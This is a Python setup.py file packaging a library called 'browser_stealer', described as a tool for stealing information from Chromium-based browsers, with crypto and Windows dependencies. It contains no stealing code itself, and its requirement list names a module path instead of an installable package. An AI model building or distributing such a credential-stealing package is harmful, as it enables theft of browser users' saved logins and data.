from setuptools import setup, find_packages

VERSION = "2.0.0"
REQ = ["Crypto.Cipher", "pywin32", "pyasn1"]

setup(
    name="browser_stealer",
    version=VERSION,
    author="Josakko",
    author_email="josakko@protonmail.com",
    description="Python library for stealing different info from chromium based browsers",
    packages=find_packages(),
    install_requires=REQ,
)
